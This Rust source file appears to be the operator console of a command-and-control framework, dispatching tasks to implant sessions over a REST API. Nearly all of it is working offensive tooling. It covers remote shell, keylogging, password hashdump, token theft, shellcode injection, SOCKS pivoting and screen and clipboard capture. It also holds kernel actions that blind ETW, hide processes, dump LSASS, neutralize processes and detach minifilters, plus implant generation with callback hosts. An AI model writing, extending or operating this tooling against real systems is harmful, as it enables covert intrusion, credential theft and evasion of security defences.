//! Console command dispatch: turns each session-bound/server-control [`Cmd`]
//! into a REST call or an enqueued task.
//!
//! Nearly every session task arm has the same shape — build the command JSON,
//! `POST /api/task`, log the task id, and push a [`PendingTask`] — so that
//! pattern lives in [`Enqueue`]; arms only supply their JSON, log strings, and
//! [`TaskKind`]. File-domain arms are in [`super::files`], credential arms in
//! [`super::creds`]. Log strings are byte-identical to the pre-split bridge.

use std::time::{Duration, Instant};

use super::poll::{PendingTask, TaskKind};
use super::rest;
use super::{log_push, short, BofState, BofUpdate, Cmd, WorkerState};

/// Shared context for the enqueue-task → log → push-pending pattern.
pub(super) struct Enqueue<'a> {
    pub client: &'a reqwest::Client,
    pub srv: &'a str,
    pub token: &'a Option<String>,
    pub pending: &'a mut Vec<PendingTask>,
    pub log_buf: &'a mut Vec<String>,
}

impl Enqueue<'_> {
    /// The standard arm: enqueue with the default 500ms first-poll backoff.
    pub(super) async fn task(
        self,
        session: String,
        err_tag: &str,
        cmd_json: serde_json::Value,
        kind: TaskKind,
        ok_log: impl FnOnce(u64) -> String,
    ) {
        self.task_with_backoff(
            session,
            err_tag,
            cmd_json,
            kind,
            Duration::from_millis(500),
            ok_log,
        )
        .await;
    }

    /// Same, with an explicit first-poll backoff (T-REX waits 5s).
    pub(super) async fn task_with_backoff(
        self,
        session: String,
        err_tag: &str,
        cmd_json: serde_json::Value,
        kind: TaskKind,
        backoff: Duration,
        ok_log: impl FnOnce(u64) -> String,
    ) {
        match rest::enqueue_task(self.client, self.srv, &session, cmd_json, self.token).await {
            Ok(tid) => {
                log_push(self.log_buf, ok_log(tid));
                self.pending.push(PendingTask {
                    session,
                    task_id: tid,
                    kind,
                    backoff,
                    last_poll: Instant::now(),
                });
            }
            Err(e) => log_push(self.log_buf, format!("! {err_tag}: {e}")),
        }
    }
}

impl WorkerState {
    /// Build the shared enqueue context for one command. `server` is the
    /// per-command clone from [`WorkerState::dispatch`]; `None` (not
    /// connected) is handled by each call site's guard.
    pub(super) fn enqueue_for<'a>(
        &'a mut self,
        client: &'a reqwest::Client,
        server: &'a (String, Option<String>),
    ) -> Enqueue<'a> {
        Enqueue {
            client,
            srv: &server.0,
            token: &server.1,
            pending: &mut self.pending,
            log_buf: &mut self.log_buf,
        }
    }

    /// Dispatch one drained UI command. `Connect`/`Shutdown` are handled by
    /// the worker loop and never arrive here.
    pub(super) async fn dispatch(&mut self, client: &reqwest::Client, cmd: Cmd) {
        // Most arms need the server; clone once per command (user-driven, so
        // rare) instead of borrowing `self` across every `&mut self` use.
        let server = self.server.clone();
        match cmd {
            // ---- file domain (files.rs) ----
            Cmd::Ls { .. }
            | Cmd::Upload { .. }
            | Cmd::Download { .. }
            | Cmd::FileOp { .. }
            | Cmd::Driveinfo { .. } => self.dispatch_files(client, cmd).await,

            // ---- credential vault (creds.rs) ----
            Cmd::FetchCreds { .. } | Cmd::CredAdd { .. } | Cmd::CredDelete { .. } => {
                self.dispatch_creds(client, cmd).await
            }

            // ---- session task queue ----
            Cmd::Shell { session, args } => {
                let Some(server) = server.as_ref() else { return };
                self.enqueue_for(client, server)
                    .task(
                        session.clone(),
                        "shell",
                        serde_json::json!({ "type": "shell", "args": args }),
                        TaskKind::Generic("shell".to_string()),
                        |tid| format!("[{}] $ {} → task {}", short(&session), args, tid),
                    )
                    .await;
            }
            Cmd::Ps { session, args } => {
                let Some(server) = server.as_ref() else { return };
                self.enqueue_for(client, server)
                    .task(
                        session.clone(),
                        "ps",
                        serde_json::json!({ "type": "shell", "args": args }),
                        TaskKind::Ps,
                        |tid| format!("[{}] ps → task {}", short(&session), tid),
                    )
                    .await;
            }
            Cmd::Ping { session } => {
                let Some(server) = server.as_ref() else { return };
                self.enqueue_for(client, server)
                    .task(
                        session.clone(),
                        "ping",
                        serde_json::json!({ "type": "ping" }),
                        TaskKind::Generic("ping".to_string()),
                        |tid| format!("[{}] ping → task {}", short(&session), tid),
                    )
                    .await;
            }
            Cmd::Sleep {
                session,
                seconds,
                jitter_pct,
            } => {
                let Some(server) = server.as_ref() else { return };
                self.enqueue_for(client, server)
                    .task(
                        session.clone(),
                        "sleep",
                        serde_json::json!({ "type": "sleep", "seconds": seconds, "jitter_pct": jitter_pct }),
                        TaskKind::Generic("sleep".to_string()),
                        |tid| {
                            format!(
                                "[{}] sleep {} {}% → task {}",
                                short(&session),
                                seconds,
                                jitter_pct,
                                tid
                            )
                        },
                    )
                    .await;
            }
            Cmd::Exit { session } => {
                let Some(server) = server.as_ref() else { return };
                self.enqueue_for(client, server)
                    .task(
                        session.clone(),
                        "exit",
                        serde_json::json!({ "type": "exit" }),
                        TaskKind::Generic("exit".to_string()),
                        |tid| format!("[{}] exit → task {}", short(&session), tid),
                    )
                    .await;
            }
            Cmd::ConnectChan {
                session,
                host,
                port,
            } => {
                let Some(server) = server.as_ref() else { return };
                self.enqueue_for(client, server)
                    .task(
                        session.clone(),
                        "connect",
                        serde_json::json!({ "type": "connect", "host": host, "port": port }),
                        TaskKind::Generic("connect".to_string()),
                        |tid| {
                            format!(
                                "[{}] connect {}:{} → task {}",
                                short(&session),
                                host,
                                port,
                                tid
                            )
                        },
                    )
                    .await;
            }
            Cmd::Socks {
                session,
                chan,
                op,
                addr,
                port,
            } => {
                let Some(server) = server.as_ref() else { return };
                self.enqueue_for(client, server)
                    .task(
                        session.clone(),
                        "socks",
                        serde_json::json!({ "type": "socks", "chan": chan, "op": op, "addr": addr, "port": port }),
                        TaskKind::Generic("socks".to_string()),
                        |tid| format!("[{}] socks op {} → task {}", short(&session), op, tid),
                    )
                    .await;
            }
            Cmd::Portscan {
                session,
                host,
                ports,
            } => {
                let Some(server) = server.as_ref() else { return };
                self.enqueue_for(client, server)
                    .task(
                        session.clone(),
                        "portscan",
                        serde_json::json!({ "type": "portscan", "host": host, "ports": ports }),
                        TaskKind::Generic("portscan".to_string()),
                        |tid| {
                            format!(
                                "[{}] portscan {} {} → task {}",
                                short(&session),
                                host,
                                ports,
                                tid
                            )
                        },
                    )
                    .await;
            }
            Cmd::Net { session, query } => {
                let Some(server) = server.as_ref() else { return };
                self.enqueue_for(client, server)
                    .task(
                        session.clone(),
                        "net",
                        serde_json::json!({ "type": "net", "query": query }),
                        TaskKind::Generic("net".to_string()),
                        |tid| format!("[{}] net {} → task {}", short(&session), query, tid),
                    )
                    .await;
            }
            Cmd::Screenshot { session, monitor } => {
                let Some(server) = server.as_ref() else { return };
                self.enqueue_for(client, server)
                    .task(
                        session.clone(),
                        "screenshot",
                        serde_json::json!({ "type": "screenshot", "monitor": monitor }),
                        TaskKind::Generic("screenshot".to_string()),
                        |tid| {
                            format!(
                                "[{}] screenshot {} → task {}",
                                short(&session),
                                monitor,
                                tid
                            )
                        },
                    )
                    .await;
            }
            Cmd::Screenwatch {
                session,
                interval_secs,
            } => {
                let Some(server) = server.as_ref() else { return };
                self.enqueue_for(client, server)
                    .task(
                        session.clone(),
                        "screenwatch",
                        serde_json::json!({ "type": "screenwatch", "interval_secs": interval_secs }),
                        TaskKind::Generic("screenwatch".to_string()),
                        |tid| {
                            format!(
                                "[{}] screenwatch {}s → task {}",
                                short(&session),
                                interval_secs,
                                tid
                            )
                        },
                    )
                    .await;
            }
            Cmd::Clipboard { session } => {
                let Some(server) = server.as_ref() else { return };
                self.enqueue_for(client, server)
                    .task(
                        session.clone(),
                        "clipboard",
                        serde_json::json!({ "type": "clipboard" }),
                        TaskKind::Generic("clipboard".to_string()),
                        |tid| format!("[{}] clipboard → task {}", short(&session), tid),
                    )
                    .await;
            }
            Cmd::Env { session, name } => {
                let Some(server) = server.as_ref() else { return };
                self.enqueue_for(client, server)
                    .task(
                        session.clone(),
                        "env",
                        serde_json::json!({ "type": "env", "name": name }),
                        TaskKind::Generic("env".to_string()),
                        |tid| format!("[{}] env {} → task {}", short(&session), name, tid),
                    )
                    .await;
            }
            Cmd::Keylog { session, action } => {
                let Some(server) = server.as_ref() else { return };
                self.enqueue_for(client, server)
                    .task(
                        session.clone(),
                        "keylog",
                        serde_json::json!({ "type": "keylog", "action": action }),
                        TaskKind::Generic("keylog".to_string()),
                        |tid| format!("[{}] keylog {} → task {}", short(&session), action, tid),
                    )
                    .await;
            }
            Cmd::Hashdump { session, method } => {
                let Some(server) = server.as_ref() else { return };
                self.enqueue_for(client, server)
                    .task(
                        session.clone(),
                        "hashdump",
                        serde_json::json!({ "type": "hashdump", "method": method }),
                        TaskKind::Hashdump,
                        |tid| format!("[{}] hashdump {} → task {}", short(&session), method, tid),
                    )
                    .await;
            }
            Cmd::StealToken { session, pid } => {
                let Some(server) = server.as_ref() else { return };
                self.enqueue_for(client, server)
                    .task(
                        session.clone(),
                        "steal_token",
                        serde_json::json!({ "type": "stealtoken", "pid": pid }),
                        TaskKind::Generic("stealtoken".to_string()),
                        |tid| format!("[{}] steal_token({pid}) → task {}", short(&session), tid),
                    )
                    .await;
            }
            Cmd::MakeToken {
                session,
                domain,
                user,
                password,
                logon_type,
            } => {
                let Some(server) = server.as_ref() else { return };
                self.enqueue_for(client, server)
                    .task(
                        session.clone(),
                        "make_token",
                        serde_json::json!({ "type": "maketoken", "domain": domain, "user": user, "password": password, "logon_type": logon_type }),
                        TaskKind::Generic("maketoken".to_string()),
                        |tid| {
                            format!(
                                "[{}] make_token({domain}\\{user}) → task {}",
                                short(&session),
                                tid
                            )
                        },
                    )
                    .await;
            }
            Cmd::Rev2Self { session } => {
                let Some(server) = server.as_ref() else { return };
                self.enqueue_for(client, server)
                    .task(
                        session.clone(),
                        "rev2self",
                        serde_json::json!({ "type": "rev2self" }),
                        TaskKind::Generic("rev2self".to_string()),
                        |tid| format!("[{}] rev2self → task {}", short(&session), tid),
                    )
                    .await;
            }
            Cmd::GetUid { session } => {
                let Some(server) = server.as_ref() else { return };
                self.enqueue_for(client, server)
                    .task(
                        session.clone(),
                        "getuid",
                        serde_json::json!({ "type": "getuid" }),
                        TaskKind::Generic("getuid".to_string()),
                        |tid| format!("[{}] getuid → task {}", short(&session), tid),
                    )
                    .await;
            }
            Cmd::Bof {
                session,
                name,
                args,
                data_hex,
            } => {
                let Some((srv, token)) = server.as_ref() else {
                    log_push(&mut self.log_buf, "! not connected");
                    return;
                };
                let args_vec: Vec<&str> = if args.trim().is_empty() {
                    Vec::new()
                } else {
                    args.split_whitespace().collect()
                };
                let cmd_json = serde_json::json!({ "type": "bof", "name": name, "args": args_vec, "data_hex": data_hex });
                match rest::enqueue_task(client, srv, &session, cmd_json, token).await {
                    Ok(tid) => {
                        log_push(
                            &mut self.log_buf,
                            format!("[{}] bof {} → task {}", short(&session), name, tid),
                        );
                        self.bof_updates.push(BofUpdate {
                            name: name.clone(),
                            args: args.clone(),
                            status: BofState::Pending,
                        });
                        self.pending.push(PendingTask {
                            session,
                            task_id: tid,
                            kind: TaskKind::Bof { name, args },
                            backoff: Duration::from_millis(500),
                            last_poll: Instant::now(),
                        });
                    }
                    Err(e) => {
                        log_push(&mut self.log_buf, format!("! bof enqueue: {e}"));
                        self.bof_updates.push(BofUpdate {
                            name,
                            args,
                            status: BofState::Error,
                        });
                    }
                }
            }
            Cmd::Inject {
                session,
                method,
                pid,
                spawn_to,
                sc_hex,
            } => {
                let Some(server) = server.as_ref() else { return };
                self.enqueue_for(client, server)
                    .task(
                        session.clone(),
                        "inject",
                        serde_json::json!({
                            "type": "inject",
                            "method": method,
                            "pid": pid,
                            "spawn_to": spawn_to,
                            "sc_hex": sc_hex,
                        }),
                        TaskKind::Generic("inject".to_string()),
                        |tid| {
                            format!(
                                "[{}] inject m={method} pid={pid} → task {}",
                                short(&session),
                                tid
                            )
                        },
                    )
                    .await;
            }
            Cmd::ChannelClose { session, chan } => {
                let Some(server) = server.as_ref() else { return };
                self.enqueue_for(client, server)
                    .task(
                        session.clone(),
                        "channelclose",
                        serde_json::json!({ "type": "channelclose", "chan": chan }),
                        TaskKind::Generic("channelclose".to_string()),
                        |tid| {
                            format!(
                                "[{}] channelclose chan={chan} → task {}",
                                short(&session),
                                tid
                            )
                        },
                    )
                    .await;
            }
            Cmd::Trex { session } => {
                let Some(server) = server.as_ref() else {
                    log_push(&mut self.log_buf, "! not connected");
                    return;
                };
                self.enqueue_for(client, server)
                    .task_with_backoff(
                        session.clone(),
                        "trex",
                        serde_json::json!({ "type": "trex" }),
                        TaskKind::Generic("trex".to_string()),
                        Duration::from_secs(5),
                        |tid| format!("[{}] T-REX → task {}", short(&session), tid),
                    )
                    .await;
            }
            Cmd::SetChannel { session, channel } => {
                let Some((srv, token)) = server.as_ref() else {
                    log_push(&mut self.log_buf, "! not connected");
                    return;
                };
                let cmd_json = serde_json::json!({ "type": "setchannel", "channel": channel });
                match rest::enqueue_task(client, srv, &session, cmd_json, token).await {
                    Ok(tid) => log_push(
                        &mut self.log_buf,
                        format!("[{}] channel set {channel} → task {}", short(&session), tid),
                    ),
                    Err(e) => log_push(&mut self.log_buf, format!("! channel: {e}")),
                }
            }
            Cmd::KeylogStreamStart {
                session,
                interval_secs,
            } => {
                // Clamp to a 2s floor — anything tighter would flood the
                // server with dump tasks and exhaust the result queue.
                let interval_secs = interval_secs.max(2);
                self.keylog_streaming = Some((session.clone(), interval_secs));
                log_push(
                    &mut self.log_buf,
                    format!(
                        "[{}] keylog stream started ({}s)",
                        short(&session),
                        interval_secs
                    ),
                );
            }
            Cmd::KeylogStreamStop { session } => {
                self.keylog_streaming = None;
                // Drop any in-flight KeylogStream task so it doesn't fire one
                // final dump after the operator asked to stop.
                self.pending
                    .retain(|t| !matches!(t.kind, TaskKind::KeylogStream));
                log_push(
                    &mut self.log_buf,
                    format!("[{}] keylog stream stopped", short(&session)),
                );
            }

            // ---- server-control API (no session task queue) ----
            Cmd::FetchTasks { session } => {
                let Some((srv, token)) = server.as_ref() else {
                    log_push(&mut self.log_buf, "! not connected");
                    return;
                };
                match rest::fetch_tasks(client, srv, &session, token).await {
                    Ok(rows) => {
                        if rows.is_empty() {
                            log_push(
                                &mut self.log_buf,
                                format!("[{}] tasks: queue empty", short(&session)),
                            );
                        } else {
                            log_push(
                                &mut self.log_buf,
                                format!("[{}] tasks: {} queued", short(&session), rows.len()),
                            );
                            for r in rows.iter().take(50) {
                                log_push(
                                    &mut self.log_buf,
                                    format!("  #{} {}", r.task_id, r.command),
                                );
                            }
                            if rows.len() > 50 {
                                log_push(
                                    &mut self.log_buf,
                                    format!("  ... ({} more)", rows.len() - 50),
                                );
                            }
                        }
                    }
                    Err(e) => log_push(&mut self.log_buf, format!("! tasks fetch: {e}")),
                }
            }
            Cmd::FetchAudit {
                operator,
                action,
                limit,
            } => {
                let Some((srv, token)) = server.as_ref() else {
                    return;
                };
                let mut qs: Vec<String> = Vec::new();
                if let Some(op) = &operator {
                    qs.push(format!("operator={op}"));
                }
                if let Some(ac) = &action {
                    qs.push(format!("action={ac}"));
                }
                if let Some(l) = limit {
                    qs.push(format!("limit={l}"));
                }
                let url = if qs.is_empty() {
                    format!("{srv}/api/audit")
                } else {
                    format!("{srv}/api/audit?{}", qs.join("&"))
                };
                match super::authed(client.get(&url), token).send().await {
                    Ok(resp) => match resp.json::<Vec<serde_json::Value>>().await {
                        Ok(rows) => {
                            log_push(&mut self.log_buf, format!("audit: {} record(s)", rows.len()));
                            for r in rows.iter().take(50) {
                                let seq = r.get("seq").and_then(|v| v.as_u64()).unwrap_or(0);
                                let op =
                                    r.get("operator").and_then(|v| v.as_str()).unwrap_or("?");
                                let act =
                                    r.get("action").and_then(|v| v.as_str()).unwrap_or("?");
                                let tgt =
                                    r.get("target").and_then(|v| v.as_str()).unwrap_or("");
                                log_push(&mut self.log_buf, format!("  #{seq} {op} {act} {tgt}"));
                            }
                        }
                        Err(e) => log_push(&mut self.log_buf, format!("! audit parse: {e}")),
                    },
                    Err(e) => log_push(&mut self.log_buf, format!("! audit fetch: {e}")),
                }
            }
            Cmd::FetchProfile => {
                let Some((srv, token)) = server.as_ref() else {
                    log_push(&mut self.log_buf, "! not connected");
                    return;
                };
                match rest::fetch_profile(client, srv, token).await {
                    Ok(p) => {
                        log_push(&mut self.log_buf, format!("profile: loaded={}", p.loaded));
                        if let Some(name) = &p.name {
                            log_push(&mut self.log_buf, format!("  name: {name}"));
                        }
                        if let Some(samples) = p.samples.as_ref() {
                            if !samples.is_empty() {
                                log_push(
                                    &mut self.log_buf,
                                    format!("  samples: {}", samples.len()),
                                );
                            }
                        }
                        for (k, v) in p.extra.iter() {
                            log_push(&mut self.log_buf, format!("  {k}: {v}"));
                        }
                    }
                    Err(e) => log_push(&mut self.log_buf, format!("! profile fetch: {e}")),
                }
            }
            Cmd::FetchAuditVerify => {
                let Some((srv, token)) = server.as_ref() else {
                    log_push(&mut self.log_buf, "! not connected");
                    return;
                };
                match rest::audit_verify(client, srv, token).await {
                    Ok(ok) => {
                        if ok {
                            log_push(&mut self.log_buf, "audit verify: hash chain OK");
                        } else {
                            log_push(
                                &mut self.log_buf,
                                "! audit verify: chain BROKEN — see server logs",
                            );
                        }
                    }
                    Err(e) => log_push(&mut self.log_buf, format!("! audit verify: {e}")),
                }
            }
            Cmd::RefreshSessions => {
                // Reset the change-detection signature so the next fetch
                // unconditionally pushes a snapshot even if nothing changed.
                self.last_session_sig.clear();
                log_push(&mut self.log_buf, "sessions: forced refresh");
            }

            // ---- Kernel daemon ops (P6) — `/api/kernel/*`, no task queue ----
            Cmd::KernelStatus => {
                self.kernel_call(client, server.as_ref(), "kernel", "kernel")
                    .await;
            }
            Cmd::KernelBlindEtw => {
                self.kernel_post(client, server.as_ref(), "blind-etw", "blind-etw", "blind-etw")
                    .await;
            }
            Cmd::KernelHide { pid } => {
                self.kernel_post(
                    client,
                    server.as_ref(),
                    &format!("hide?pid={pid}"),
                    &format!("hide {pid}"),
                    "hide",
                )
                .await;
            }
            Cmd::KernelDumpLsass { pid } => {
                self.kernel_post(
                    client,
                    server.as_ref(),
                    &format!("dump-lsass?pid={pid}"),
                    &format!("dump-lsass {pid}"),
                    "dump-lsass",
                )
                .await;
            }
            Cmd::KernelNeutralize { pid } => {
                self.kernel_post(
                    client,
                    server.as_ref(),
                    &format!("neutralize?pid={pid}"),
                    &format!("neutralize {pid}"),
                    "neutralize",
                )
                .await;
            }
            Cmd::KernelDetachMinifilter => {
                self.kernel_post(
                    client,
                    server.as_ref(),
                    "detach-minifilter",
                    "detach-minifilter",
                    "detach-mf",
                )
                .await;
            }

            // ---- Implant generation / inventory ----
            Cmd::GenerateImplant {
                callback,
                port,
                format,
                uri,
                sleep,
                jitter,
                tls,
                features,
            } => {
                let Some((srv, token)) = server.as_ref() else {
                    log_push(&mut self.log_buf, "! not connected");
                    return;
                };
                let body = serde_json::json!({
                    "callback": callback,
                    "port": port,
                    "format": format,
                    "uri": uri,
                    "sleep": sleep,
                    "jitter": jitter,
                    "tls": tls,
                    "features": features,
                });
                match super::authed(
                    client
                        .post(format!("{srv}/api/generate-implant"))
                        .json(&body),
                    token,
                )
                .send()
                .await
                {
                    Ok(r) => match r.json::<serde_json::Value>().await {
                        Ok(v) => {
                            let sha = v["sha256"].as_str().unwrap_or("?");
                            let pk = v["implant_pub"].as_str().unwrap_or("?");
                            log_push(
                                &mut self.log_buf,
                                format!("implant generated: pub={pk} sha256={sha}"),
                            );
                            log_push(&mut self.log_buf, format!("  response: {v}"));
                        }
                        Err(e) => {
                            log_push(&mut self.log_buf, format!("! generate-implant: {e}"))
                        }
                    },
                    Err(e) => {
                        log_push(&mut self.log_buf, format!("! generate-implant: {e}"))
                    }
                }
            }
            Cmd::FetchImplants => {
                let Some((srv, token)) = server.as_ref() else {
                    log_push(&mut self.log_buf, "! not connected");
                    return;
                };
                match super::authed(client.get(format!("{srv}/api/implants")), token)
                    .send()
                    .await
                {
                    Ok(r) => match r.json::<serde_json::Value>().await {
                        Ok(v) => {
                            if let Some(implants) = v["implants"].as_array() {
                                for imp in implants {
                                    let pk = imp["implant_pub"].as_str().unwrap_or("?");
                                    let cb = imp["callback_host"].as_str().unwrap_or("?");
                                    let used =
                                        imp["auth_token_used"].as_bool().unwrap_or(false);
                                    let rev = imp["revoked"].as_bool().unwrap_or(false);
                                    log_push(
                                        &mut self.log_buf,
                                        format!(
                                            "implant {pk} → {cb}  used={used} revoked={rev}"
                                        ),
                                    );
                                }
                            }
                            log_push(
                                &mut self.log_buf,
                                format!(
                                    "{} implants total",
                                    v["implants"].as_array().map(|a| a.len()).unwrap_or(0)
                                ),
                            );
                        }
                        Err(e) => log_push(&mut self.log_buf, format!("! implants: {e}")),
                    },
                    Err(e) => log_push(&mut self.log_buf, format!("! implants: {e}")),
                }
            }
            Cmd::RevokeImplant { implant_pub } => {
                let Some((srv, token)) = server.as_ref() else {
                    log_push(&mut self.log_buf, "! not connected");
                    return;
                };
                let body = serde_json::json!({ "implant_pub": implant_pub });
                match super::authed(
                    client.post(format!("{srv}/api/implant/revoke")).json(&body),
                    token,
                )
                .send()
                .await
                {
                    Ok(r) => match r.json::<serde_json::Value>().await {
                        Ok(v) => {
                            log_push(&mut self.log_buf, format!("revoke {implant_pub}: {v}"))
                        }
                        Err(e) => log_push(&mut self.log_buf, format!("! revoke: {e}")),
                    },
                    Err(e) => log_push(&mut self.log_buf, format!("! revoke: {e}")),
                }
            }

            // Connect/Shutdown are intercepted by the worker loop and never
            // reach dispatch.
            Cmd::Connect { .. } | Cmd::Shutdown => {}
        }
    }

    /// `GET /api/kernel/status` — the only kernel GET; the rest are POSTs.
    async fn kernel_call(
        &mut self,
        client: &reqwest::Client,
        server: Option<&(String, Option<String>)>,
        path: &str,
        tag: &str,
    ) {
        let Some((srv, token)) = server else {
            log_push(&mut self.log_buf, "! not connected");
            return;
        };
        match super::authed(client.get(format!("{srv}/api/kernel/{path}")), token)
            .send()
            .await
        {
            Ok(r) => match r.json::<serde_json::Value>().await {
                Ok(v) => log_push(&mut self.log_buf, format!("{tag}: {v}")),
                Err(e) => log_push(&mut self.log_buf, format!("! {tag}: {e}")),
            },
            Err(e) => log_push(&mut self.log_buf, format!("! {tag}: {e}")),
        }
    }

    /// `POST /api/kernel/<path>` — kernel daemon actions. Log shape matches
    /// the pre-split bridge (`"{ok_tag}: {v}"` on success, `"! {err_tag}: {e}"`;
    /// the two tags differ where the success line carries the pid).
    async fn kernel_post(
        &mut self,
        client: &reqwest::Client,
        server: Option<&(String, Option<String>)>,
        path: &str,
        ok_tag: &str,
        err_tag: &str,
    ) {
        let Some((srv, token)) = server else {
            log_push(&mut self.log_buf, "! not connected");
            return;
        };
        match super::authed(client.post(format!("{srv}/api/kernel/{path}")), token)
            .send()
            .await
        {
            Ok(r) => match r.json::<serde_json::Value>().await {
                Ok(v) => log_push(&mut self.log_buf, format!("{ok_tag}: {v}")),
                Err(e) => log_push(&mut self.log_buf, format!("! {err_tag}: {e}")),
            },
            Err(e) => log_push(&mut self.log_buf, format!("! {err_tag}: {e}")),
        }
    }
}
